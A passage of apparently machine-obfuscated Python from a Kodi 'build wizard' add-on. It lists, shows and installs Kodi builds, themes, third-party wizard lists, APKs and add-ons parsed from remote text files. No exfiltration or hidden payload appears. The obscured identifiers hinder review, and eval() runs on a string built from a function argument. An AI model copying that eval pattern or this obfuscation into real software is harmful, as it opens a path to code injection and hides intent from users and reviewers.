	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO0O0O0OOO0O0OO00 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2197
	setView ('files','viewType')#line:2198
def buildMenu ():#line:2200
	if USERNAME =='':#line:2201
		ADDON .openSettings ()#line:2202
		sys .exit ()#line:2203
	if PASSWORD =='':#line:2204
		ADDON .openSettings ()#line:2205
	OO0OO0O0000O00O0O =(SPEEDFILE )#line:2206
	(OO0OO0O0000O00O0O )#line:2207
	O0O00O0O0OOOOOOO0 =(wiz .workingURL (OO0OO0O0000O00O0O ))#line:2208
	(O0O00O0O0OOOOOOO0 )#line:2209
	O0O00O0O0OOOOOOO0 =wiz .workingURL (SPEEDFILE )#line:2210
	if not O0O00O0O0OOOOOOO0 ==True :#line:2211
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2212
		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2213
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2214
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2215
		addFile ('%s'%O0O00O0O0OOOOOOO0 ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2216
	else :#line:2217
		OOO0O0O0OOO00OO00 ,O0O0O0OOO0OO0OOOO ,O0O00OOOOO00O0OOO ,O00O0O0OOOOO00O0O ,OO000OO0OO0O0OOOO ,O0OO00000O0OO0O0O ,O00OOOOO0OOO000OO =wiz .buildCount ()#line:2218
		O00OOOO00O0O0OO0O =False ;O00O00O0000OOOOOO =[]#line:2219
		if THIRDPARTY =='true':#line:2220
			if not THIRD1NAME ==''and not THIRD1URL =='':O00OOOO00O0O0OO0O =True ;O00O00O0000OOOOOO .append ('1')#line:2221
			if not THIRD2NAME ==''and not THIRD2URL =='':O00OOOO00O0O0OO0O =True ;O00O00O0000OOOOOO .append ('2')#line:2222
			if not THIRD3NAME ==''and not THIRD3URL =='':O00OOOO00O0O0OO0O =True ;O00O00O0000OOOOOO .append ('3')#line:2223
		OO0OO0OOO0OO0OO0O =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2224
		O0OOO00O0OO0O000O =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO0OO0OOO0OO0OO0O )#line:2225
		if OOO0O0O0OOO00OO00 ==1 and O00OOOO00O0O0OO0O ==False :#line:2226
			for OOO0O00OO0OOO0OO0 ,OOOOOOO0OO0OOOOO0 ,OOOOO0000OOOO0O00 ,OO0OOOO00000O000O ,OOOO0O0O0000000OO ,O00O000O0O0000OO0 ,OOOO0O00OO0O000O0 ,OOO0OOOOO0OO0O0OO ,OO0OO0000O00O0OOO ,O000OOO000O0OO00O in O0OOO00O0OO0O000O :#line:2227
				if not SHOWADULT =='true'and OO0OO0000O00O0OOO .lower ()=='yes':continue #line:2228
				if not DEVELOPER =='true'and wiz .strTest (OOO0O00OO0OOO0OO0 ):continue #line:2229
				viewBuild (O0OOO00O0OO0O000O [0 ][0 ])#line:2230
				return #line:2231
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2234
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2235
		if O00OOOO00O0O0OO0O ==True :#line:2236
			for OO0O0000O0OOOO0OO in O00O00O0000OOOOOO :#line:2237
				OOO0O00OO0OOO0OO0 =eval ('THIRD%sNAME'%OO0O0000O0OOOO0OO )#line:2238
		if len (O0OOO00O0OO0O000O )>=1 :#line:2240
			if SEPERATE =='true':#line:2241
				for OOO0O00OO0OOO0OO0 ,OOOOOOO0OO0OOOOO0 ,OOOOO0000OOOO0O00 ,OO0OOOO00000O000O ,OOOO0O0O0000000OO ,O00O000O0O0000OO0 ,OOOO0O00OO0O000O0 ,OOO0OOOOO0OO0O0OO ,OO0OO0000O00O0OOO ,O000OOO000O0OO00O in O0OOO00O0OO0O000O :#line:2242
					if not SHOWADULT =='true'and OO0OO0000O00O0OOO .lower ()=='yes':continue #line:2243
					if not DEVELOPER =='true'and wiz .strTest (OOO0O00OO0OOO0OO0 ):continue #line:2244
					O00O0O0OO0OO000O0 =createMenu ('install','',OOO0O00OO0OOO0OO0 )#line:2245
					addDir ('[%s] %s (v%s)'%(float (OOOO0O0O0000000OO ),OOO0O00OO0OOO0OO0 ,OOOOOOO0OO0OOOOO0 ),'viewbuild',OOO0O00OO0OOO0OO0 ,description =O000OOO000O0OO00O ,fanart =OOO0OOOOO0OO0O0OO ,icon =OOOO0O00OO0O000O0 ,menu =O00O0O0OO0OO000O0 ,themeit =THEME2 )#line:2246
			else :#line:2247
				if O00O0O0OOOOO00O0O >0 :#line:2248
					O0O0O000OO0OO0O00 ='+'if SHOW17 =='false'else '-'#line:2249
					if SHOW17 =='true':#line:2251
						for OOO0O00OO0OOO0OO0 ,OOOOOOO0OO0OOOOO0 ,OOOOO0000OOOO0O00 ,OO0OOOO00000O000O ,OOOO0O0O0000000OO ,O00O000O0O0000OO0 ,OOOO0O00OO0O000O0 ,OOO0OOOOO0OO0O0OO ,OO0OO0000O00O0OOO ,O000OOO000O0OO00O in O0OOO00O0OO0O000O :#line:2253
							if not SHOWADULT =='true'and OO0OO0000O00O0OOO .lower ()=='yes':continue #line:2254
							if not DEVELOPER =='true'and wiz .strTest (OOO0O00OO0OOO0OO0 ):continue #line:2255
							OOOOOO00O00OO0O0O =int (float (OOOO0O0O0000000OO ))#line:2256
							if OOOOOO00O00OO0O0O ==17 :#line:2257
								O00O0O0OO0OO000O0 =createMenu ('install','',OOO0O00OO0OOO0OO0 )#line:2258
								addDir ('[%s] %s (v%s)'%(float (OOOO0O0O0000000OO ),OOO0O00OO0OOO0OO0 ,OOOOOOO0OO0OOOOO0 ),'viewbuild',OOO0O00OO0OOO0OO0 ,description =O000OOO000O0OO00O ,fanart =OOO0OOOOO0OO0O0OO ,icon =OOOO0O00OO0O000O0 ,menu =O00O0O0OO0OO000O0 ,themeit =THEME2 )#line:2259
				if OO000OO0OO0O0OOOO >0 :#line:2260
					O0O0O000OO0OO0O00 ='+'if SHOW18 =='false'else '-'#line:2261
					if SHOW18 =='true':#line:2263
						for OOO0O00OO0OOO0OO0 ,OOOOOOO0OO0OOOOO0 ,OOOOO0000OOOO0O00 ,OO0OOOO00000O000O ,OOOO0O0O0000000OO ,O00O000O0O0000OO0 ,OOOO0O00OO0O000O0 ,OOO0OOOOO0OO0O0OO ,OO0OO0000O00O0OOO ,O000OOO000O0OO00O in O0OOO00O0OO0O000O :#line:2265
							if not SHOWADULT =='true'and OO0OO0000O00O0OOO .lower ()=='yes':continue #line:2266
							if not DEVELOPER =='true'and wiz .strTest (OOO0O00OO0OOO0OO0 ):continue #line:2267
							OOOOOO00O00OO0O0O =int (float (OOOO0O0O0000000OO ))#line:2268
							if OOOOOO00O00OO0O0O ==18 :#line:2269
								O00O0O0OO0OO000O0 =createMenu ('install','',OOO0O00OO0OOO0OO0 )#line:2270
								addDir ('[%s] %s (v%s)'%(float (OOOO0O0O0000000OO ),OOO0O00OO0OOO0OO0 ,OOOOOOO0OO0OOOOO0 ),'viewbuild',OOO0O00OO0OOO0OO0 ,description =O000OOO000O0OO00O ,fanart =OOO0OOOOO0OO0O0OO ,icon =OOOO0O00OO0O000O0 ,menu =O00O0O0OO0OO000O0 ,themeit =THEME2 )#line:2271
				if O0O00OOOOO00O0OOO >0 :#line:2272
					O0O0O000OO0OO0O00 ='+'if SHOW16 =='false'else '-'#line:2273
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(O0O0O000OO0OO0O00 ,O0O00OOOOO00O0OOO ),'togglesetting','show16',themeit =THEME3 )#line:2274
					if SHOW16 =='true':#line:2275
						for OOO0O00OO0OOO0OO0 ,OOOOOOO0OO0OOOOO0 ,OOOOO0000OOOO0O00 ,OO0OOOO00000O000O ,OOOO0O0O0000000OO ,O00O000O0O0000OO0 ,OOOO0O00OO0O000O0 ,OOO0OOOOO0OO0O0OO ,OO0OO0000O00O0OOO ,O000OOO000O0OO00O in O0OOO00O0OO0O000O :#line:2276
							if not SHOWADULT =='true'and OO0OO0000O00O0OOO .lower ()=='yes':continue #line:2277
							if not DEVELOPER =='true'and wiz .strTest (OOO0O00OO0OOO0OO0 ):continue #line:2278
							OOOOOO00O00OO0O0O =int (float (OOOO0O0O0000000OO ))#line:2279
							if OOOOOO00O00OO0O0O ==16 :#line:2280
								O00O0O0OO0OO000O0 =createMenu ('install','',OOO0O00OO0OOO0OO0 )#line:2281
								addDir ('[%s] %s (v%s)'%(float (OOOO0O0O0000000OO ),OOO0O00OO0OOO0OO0 ,OOOOOOO0OO0OOOOO0 ),'viewbuild',OOO0O00OO0OOO0OO0 ,description =O000OOO000O0OO00O ,fanart =OOO0OOOOO0OO0O0OO ,icon =OOOO0O00OO0O000O0 ,menu =O00O0O0OO0OO000O0 ,themeit =THEME2 )#line:2282
				if O0O0O0OOO0OO0OOOO >0 :#line:2283
					O0O0O000OO0OO0O00 ='+'if SHOW15 =='false'else '-'#line:2284
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(O0O0O000OO0OO0O00 ,O0O0O0OOO0OO0OOOO ),'togglesetting','show15',themeit =THEME3 )#line:2285
					if SHOW15 =='true':#line:2286
						for OOO0O00OO0OOO0OO0 ,OOOOOOO0OO0OOOOO0 ,OOOOO0000OOOO0O00 ,OO0OOOO00000O000O ,OOOO0O0O0000000OO ,O00O000O0O0000OO0 ,OOOO0O00OO0O000O0 ,OOO0OOOOO0OO0O0OO ,OO0OO0000O00O0OOO ,O000OOO000O0OO00O in O0OOO00O0OO0O000O :#line:2287
							if not SHOWADULT =='true'and OO0OO0000O00O0OOO .lower ()=='yes':continue #line:2288
							if not DEVELOPER =='true'and wiz .strTest (OOO0O00OO0OOO0OO0 ):continue #line:2289
							OOOOOO00O00OO0O0O =int (float (OOOO0O0O0000000OO ))#line:2290
							if OOOOOO00O00OO0O0O <=15 :#line:2291
								O00O0O0OO0OO000O0 =createMenu ('install','',OOO0O00OO0OOO0OO0 )#line:2292
								addDir ('[%s] %s (v%s)'%(float (OOOO0O0O0000000OO ),OOO0O00OO0OOO0OO0 ,OOOOOOO0OO0OOOOO0 ),'viewbuild',OOO0O00OO0OOO0OO0 ,description =O000OOO000O0OO00O ,fanart =OOO0OOOOO0OO0O0OO ,icon =OOOO0O00OO0O000O0 ,menu =O00O0O0OO0OO000O0 ,themeit =THEME2 )#line:2293
		elif O00OOOOO0OOO000OO >0 :#line:2294
			if O0OO00000O0OO0O0O >0 :#line:2295
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2296
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2297
			else :#line:2298
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2299
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2300
	setView ('files','viewType')#line:2301
def viewBuild (OOOOO00000O0OO000 ):#line:2303
	O00OOO00OO000O0OO =wiz .workingURL (SPEEDFILE )#line:2304
	if not O00OOO00OO000O0OO ==True :#line:2305
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2306
		addFile ('%s'%O00OOO00OO000O0OO ,'',themeit =THEME3 )#line:2307
		return #line:2308
	if wiz .checkBuild (OOOOO00000O0OO000 ,'version')==False :#line:2309
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2310
		addFile ('%s was not found in the builds list.'%OOOOO00000O0OO000 ,'',themeit =THEME3 )#line:2311
		return #line:2312
	O000OOO0O0000O000 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2313
	OOOOOO000O0OOO0OO =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OOOOO00000O0OO000 ).findall (O000OOO0O0000O000 )#line:2314
	for O00O0OOOO0O0OO0OO ,O00OOO000OO0O0OO0 ,O0OO00000O00O0O0O ,OOO000OO00000000O ,OOOOOO0OOO0O0OOOO ,OO00000O00OOO00O0 ,OOOOOO0000OOOO00O ,O00OO0OO00OOOO0O0 ,OOOOO0000O00O0OO0 ,O000OO0000O0O0OOO in OOOOOO000O0OOO0OO :#line:2315
		OO00000O00OOO00O0 =OO00000O00OOO00O0 if wiz .workingURL (OO00000O00OOO00O0 )else ICON #line:2316
		OOOOOO0000OOOO00O =OOOOOO0000OOOO00O if wiz .workingURL (OOOOOO0000OOOO00O )else FANART #line:2317
		O00O0000O00O0000O ='%s (v%s)'%(OOOOO00000O0OO000 ,O00O0OOOO0O0OO0OO )#line:2318
		if BUILDNAME ==OOOOO00000O0OO000 and O00O0OOOO0O0OO0OO >BUILDVERSION :#line:2319
			O00O0000O00O0000O ='%s [COLOR red][CURRENT v%s][/COLOR]'%(O00O0000O00O0000O ,BUILDVERSION )#line:2320
		OO00OOOO000000OOO =int (float (KODIV ));O0OOO0O0000OO0OOO =int (float (OOO000OO00000000O ))#line:2329
		if not OO00OOOO000000OOO ==O0OOO0O0000OO0OOO :#line:2330
			if OO00OOOO000000OOO ==16 and O0OOO0O0000OO0OOO <=15 :OO00OOO0O00O0OO0O =False #line:2331
			else :OO00OOO0O00O0OO0O =True #line:2332
		else :OO00OOO0O00O0OO0O =False #line:2333
		addFile ('התקנה','install',OOOOO00000O0OO000 ,'fresh',description =O000OO0000O0O0OOO ,fanart =OOOOOO0000OOOO00O ,icon =OO00000O00OOO00O0 ,themeit =THEME1 )#line:2337
		if not OOOOOO0OOO0O0OOOO =='http://':#line:2340
			if wiz .workingURL (OOOOOO0OOO0O0OOOO )==True :#line:2341
				addFile (wiz .sep ('THEMES'),'',fanart =OOOOOO0000OOOO00O ,icon =OO00000O00OOO00O0 ,themeit =THEME3 )#line:2342
				O000OOO0O0000O000 =wiz .openURL (OOOOOO0OOO0O0OOOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2343
				OOOOOO000O0OOO0OO =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O000OOO0O0000O000 )#line:2344
				for OOO0OO000O0OO0O00 ,OOO00O00O0OOO00O0 ,O000O000OO0OO00OO ,O0O000O0O000OOOOO ,O0O00OO00OO00OO0O ,O000OO0000O0O0OOO in OOOOOO000O0OOO0OO :#line:2345
					if not SHOWADULT =='true'and O0O00OO00OO00OO0O .lower ()=='yes':continue #line:2346
					O000O000OO0OO00OO =O000O000OO0OO00OO if O000O000OO0OO00OO =='http://'else OO00000O00OOO00O0 #line:2347
					O0O000O0O000OOOOO =O0O000O0O000OOOOO if O0O000O0O000OOOOO =='http://'else OOOOOO0000OOOO00O #line:2348
					addFile (OOO0OO000O0OO0O00 if not OOO0OO000O0OO0O00 ==BUILDTHEME else "[B]%s (Installed)[/B]"%OOO0OO000O0OO0O00 ,'theme',OOOOO00000O0OO000 ,OOO0OO000O0OO0O00 ,description =O000OO0000O0O0OOO ,fanart =O0O000O0O000OOOOO ,icon =O000O000OO0OO00OO ,themeit =THEME3 )#line:2349
	setView ('files','viewType')#line:2350
def viewThirdList (O0O00O00OO000OOOO ):#line:2352
	O000OO000OO0OO0OO =eval ('THIRD%sNAME'%O0O00O00OO000OOOO )#line:2353
	OOO000OOOOO000O00 =eval ('THIRD%sURL'%O0O00O00OO000OOOO )#line:2354
	OO000000OOO00O0O0 =wiz .workingURL (OOO000OOOOO000O00 )#line:2355
	if not OO000000OOO00O0O0 ==True :#line:2356
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2357
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2358
	else :#line:2359
		O0O00OO000O000OO0 ,O0O00O00OOO0O0OOO =wiz .thirdParty (OOO000OOOOO000O00 )#line:2360
		addFile ("[B]%s[/B]"%O000OO000OO0OO0OO ,'',themeit =THEME3 )#line:2361
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2362
		if O0O00OO000O000OO0 :#line:2363
			for O000OO000OO0OO0OO ,OO00000000OOOOOO0 ,OOO000OOOOO000O00 ,O0OOOO0OOO0O00OO0 ,O00O0O0O0000O00O0 ,OOOO0O00O0OO00O0O ,O0OO0O000OO0OOO0O ,O0O00OOOO0O000000 in O0O00O00OOO0O0OOO :#line:2364
				if not SHOWADULT =='true'and O0OO0O000OO0OOO0O .lower ()=='yes':continue #line:2365
				addFile ("[%s] %s v%s"%(O0OOOO0OOO0O00OO0 ,O000OO000OO0OO0OO ,OO00000000OOOOOO0 ),'installthird',O000OO000OO0OO0OO ,OOO000OOOOO000O00 ,icon =O00O0O0O0000O00O0 ,fanart =OOOO0O00O0OO00O0O ,description =O0O00OOOO0O000000 ,themeit =THEME2 )#line:2366
		else :#line:2367
			for O000OO000OO0OO0OO ,OOO000OOOOO000O00 ,O00O0O0O0000O00O0 ,OOOO0O00O0OO00O0O ,O0O00OOOO0O000000 in O0O00O00OOO0O0OOO :#line:2368
				addFile (O000OO000OO0OO0OO ,'installthird',O000OO000OO0OO0OO ,OOO000OOOOO000O00 ,icon =O00O0O0O0000O00O0 ,fanart =OOOO0O00O0OO00O0O ,description =O0O00OOOO0O000000 ,themeit =THEME2 )#line:2369
def editThirdParty (O0OO00O0O000O0000 ):#line:2371
	OOOOO0O0OO00O0OO0 =eval ('THIRD%sNAME'%O0OO00O0O000O0000 )#line:2372
	O0O0O00OO0O000OOO =eval ('THIRD%sURL'%O0OO00O0O000O0000 )#line:2373
	O0OOOOO0O0O00O000 =wiz .getKeyboard (OOOOO0O0OO00O0OO0 ,'Enter the Name of the Wizard')#line:2374
	OOO0O0OO00O00OO00 =wiz .getKeyboard (O0O0O00OO0O000OOO ,'Enter the URL of the Wizard Text')#line:2375
	wiz .setS ('wizard%sname'%O0OO00O0O000O0000 ,O0OOOOO0O0O00O000 )#line:2377
	wiz .setS ('wizard%surl'%O0OO00O0O000O0000 ,OOO0O0OO00O00OO00 )#line:2378
def apkScraper (name =""):#line:2380
	if name =='kodi':#line:2381
		O0OO00000O0O000O0 ='http://mirrors.kodi.tv/releases/android/arm/'#line:2382
		O0O0O0O00O0OOOO00 ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2383
		O00OO0O000OOO0000 =wiz .openURL (O0OO00000O0O000O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2384
		O000OO000OOOO0OOO =wiz .openURL (O0O0O0O00O0OOOO00 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2385
		O0OO00O0OOOO0OO0O =0 #line:2386
		OOO0OOOOO000O0OO0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O00OO0O000OOO0000 )#line:2387
		OO00OO0O000OOO0OO =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O000OO000OOOO0OOO )#line:2388
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2390
		OOO000OO000OO0O00 =False #line:2391
		for OOO0000000O00OOO0 ,name ,O0OOOOO00O000OOO0 ,O0000OO0OOOOOOOOO in OOO0OOOOO000O0OO0 :#line:2392
			if OOO0000000O00OOO0 in ['../','old/']:continue #line:2393
			if not OOO0000000O00OOO0 .endswith ('.apk'):continue #line:2394
			if not OOO0000000O00OOO0 .find ('_')==-1 and OOO000OO000OO0O00 ==True :continue #line:2395
			try :#line:2396
				OOO0O0000OOO000OO =name .split ('-')#line:2397
				if not OOO0000000O00OOO0 .find ('_')==-1 :#line:2398
					OOO000OO000OO0O00 =True #line:2399
					OOO00OO00O0O0O0O0 ,OO0OO0O00O0O00000 =OOO0O0000OOO000OO [2 ].split ('_')#line:2400
				else :#line:2401
					OOO00OO00O0O0O0O0 =OOO0O0000OOO000OO [2 ]#line:2402
					OO0OO0O00O0O00000 =''#line:2403
				O0O000O0O0OO000OO ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0O0000OOO000OO [0 ].title (),OOO0O0000OOO000OO [1 ],OO0OO0O00O0O00000 .upper (),OOO00OO00O0O0O0O0 ,COLOR2 ,O0OOOOO00O000OOO0 .replace (' ',''),COLOR1 ,O0000OO0OOOOOOOOO )#line:2404
				OO00O0OOOO00OO000 =urljoin (O0OO00000O0O000O0 ,OOO0000000O00OOO0 )#line:2405
				addFile (O0O000O0O0OO000OO ,'apkinstall',"%s v%s%s %s"%(OOO0O0000OOO000OO [0 ].title (),OOO0O0000OOO000OO [1 ],OO0OO0O00O0O00000 .upper (),OOO00OO00O0O0O0O0 ),OO00O0OOOO00OO000 )#line:2406
				O0OO00O0OOOO0OO0O +=1 #line:2407
			except :#line:2408
				wiz .log ("Error on: %s"%name )#line:2409
		for OOO0000000O00OOO0 ,name ,O0OOOOO00O000OOO0 ,O0000OO0OOOOOOOOO in OO00OO0O000OOO0OO :#line:2411
			if OOO0000000O00OOO0 in ['../','old/']:continue #line:2412
			if not OOO0000000O00OOO0 .endswith ('.apk'):continue #line:2413
			if not OOO0000000O00OOO0 .find ('_')==-1 :continue #line:2414
			try :#line:2415
				OOO0O0000OOO000OO =name .split ('-')#line:2416
				O0O000O0O0OO000OO ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0O0000OOO000OO [0 ].title (),OOO0O0000OOO000OO [1 ],OOO0O0000OOO000OO [2 ],COLOR2 ,O0OOOOO00O000OOO0 .replace (' ',''),COLOR1 ,O0000OO0OOOOOOOOO )#line:2417
				OO00O0OOOO00OO000 =urljoin (O0O0O0O00O0OOOO00 ,OOO0000000O00OOO0 )#line:2418
				addFile (O0O000O0O0OO000OO ,'apkinstall',"%s v%s %s"%(OOO0O0000OOO000OO [0 ].title (),OOO0O0000OOO000OO [1 ],OOO0O0000OOO000OO [2 ]),OO00O0OOOO00OO000 )#line:2419
				O0OO00O0OOOO0OO0O +=1 #line:2420
			except :#line:2421
				wiz .log ("Error on: %s"%name )#line:2422
		if O0OO00O0OOOO0OO0O ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2423
	elif name =='spmc':#line:2424
		OOOO0OO000OOO0O00 ='https://github.com/koying/SPMC/releases'#line:2425
		O00OO0O000OOO0000 =wiz .openURL (OOOO0OO000OOO0O00 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2426
		O0OO00O0OOOO0OO0O =0 #line:2427
		OOO0OOOOO000O0OO0 =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (O00OO0O000OOO0000 )#line:2428
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2430
		for name ,O00OO0OO0O00OO00O in OOO0OOOOO000O0OO0 :#line:2432
			OO00OOOO0OOO0OOOO =''#line:2433
			OO00OO0O000OOO0OO =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (O00OO0OO0O00OO00O )#line:2434
			for O0O0000O0OOO000O0 ,O0O00000OO000OO00 ,O0O00O00OOOO0OOO0 in OO00OO0O000OOO0OO :#line:2435
				if O0O00O00OOOO0OOO0 .find ('armeabi')==-1 :continue #line:2436
				if O0O00O00OOOO0OOO0 .find ('launcher')>-1 :continue #line:2437
				OO00OOOO0OOO0OOOO =urljoin ('https://github.com',O0O0000O0OOO000O0 )#line:2438
				break #line:2439
		if O0OO00O0OOOO0OO0O ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2441
def apkMenu (url =None ):#line:2443
	if url ==None :#line:2444
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2447
	if not APKFILE =='http://':#line:2448
		if url ==None :#line:2449
			OO0000000OO000O0O =wiz .workingURL (APKFILE )#line:2450
			OO00O0O00000OOO00 =uservar .APKFILE #line:2451
		else :#line:2452
			OO0000000OO000O0O =wiz .workingURL (url )#line:2453
			OO00O0O00000OOO00 =url #line:2454
		if OO0000000OO000O0O ==True :#line:2455
			O0OO0O00000OO000O =wiz .openURL (OO00O0O00000OOO00 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2456
			OO0OOOOOO0OO000OO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0OO0O00000OO000O )#line:2457
			if len (OO0OOOOOO0OO000OO )>0 :#line:2458
				O000O0O00O0O0O000 =0 #line:2459
				for O0O0OO0O0OOO0OO00 ,O0O000OO00O0OO0OO ,url ,OOO0O0O00OOO0O0O0 ,OOO0O000O0000O000 ,OO0O0O0OOOO0O0OOO ,OO000O00000000O0O in OO0OOOOOO0OO000OO :#line:2460
					if not SHOWADULT =='true'and OO0O0O0OOOO0O0OOO .lower ()=='yes':continue #line:2461
					if O0O000OO00O0OO0OO .lower ()=='yes':#line:2462
						O000O0O00O0O0O000 +=1 #line:2463
						addDir ("[B]%s[/B]"%O0O0OO0O0OOO0OO00 ,'apk',url ,description =OO000O00000000O0O ,icon =OOO0O0O00OOO0O0O0 ,fanart =OOO0O000O0000O000 ,themeit =THEME3 )#line:2464
					else :#line:2465
						O000O0O00O0O0O000 +=1 #line:2466
						addFile (O0O0OO0O0OOO0OO00 ,'apkinstall',O0O0OO0O0OOO0OO00 ,url ,description =OO000O00000000O0O ,icon =OOO0O0O00OOO0O0O0 ,fanart =OOO0O000O0000O000 ,themeit =THEME2 )#line:2467
					if O000O0O00O0O0O000 <1 :#line:2468
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2469
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2470
		else :#line:2471
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2472
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2473
			addFile ('%s'%OO0000000OO000O0O ,'',themeit =THEME3 )#line:2474
		return #line:2475
	else :wiz .log ("[APK Menu] No APK list added.")#line:2476
	setView ('files','viewType')#line:2477
def addonMenu (url =None ):#line:2479
	if not ADDONFILE =='http://':#line:2480
		if url ==None :#line:2481
			OOOOOOOO0O0OOOOO0 =wiz .workingURL (ADDONFILE )#line:2482
			OOOO0OO000O0000O0 =uservar .ADDONFILE #line:2483
		else :#line:2484
			OOOOOOOO0O0OOOOO0 =wiz .workingURL (url )#line:2485
			OOOO0OO000O0000O0 =url #line:2486
		if OOOOOOOO0O0OOOOO0 ==True :#line:2487
			OOOOO0OOO00OOO000 =wiz .openURL (OOOO0OO000O0000O0 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2488
			OO00O0O000000O0O0 =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOOOO0OOO00OOO000 )#line:2489
			if len (OO00O0O000000O0O0 )>0 :#line:2490
				OO0OOOOOO00O0000O =0 #line:2491
				for OOOO0OOO0OOOO00O0 ,O0OOO00O0OO00OO00 ,url ,O0OOOOO00O00OOOOO ,O00OOOO00000OOOOO ,OO0OO0OOO00000O00 ,O0O0000OOO0O0OOO0 ,O0OO0OOO0OO0OO000 ,O00O0O0OOO0OOOO00 ,OOOOO00OOOO0OO000 in OO00O0O000000O0O0 :#line:2492
					if O0OOO00O0OO00OO00 .lower ()=='section':#line:2493
						OO0OOOOOO00O0000O +=1 #line:2494
						addDir ("[B]%s[/B]"%OOOO0OOO0OOOO00O0 ,'addons',url ,description =OOOOO00OOOO0OO000 ,icon =O0O0000OOO0O0OOO0 ,fanart =O0OO0OOO0OO0OO000 ,themeit =THEME3 )#line:2495
					else :#line:2496
						if not SHOWADULT =='true'and O00O0O0OOO0OOOO00 .lower ()=='yes':continue #line:2497
						try :#line:2498
							O0OOOO000OOOOO0OO =xbmcaddon .Addon (id =O0OOO00O0OO00OO00 ).getAddonInfo ('path')#line:2499
							if os .path .exists (O0OOOO000OOOOO0OO ):#line:2500
								OOOO0OOO0OOOO00O0 ="[COLOR green][Installed][/COLOR] %s"%OOOO0OOO0OOOO00O0 #line:2501
						except :#line:2502
							pass #line:2503
						OO0OOOOOO00O0000O +=1 #line:2504
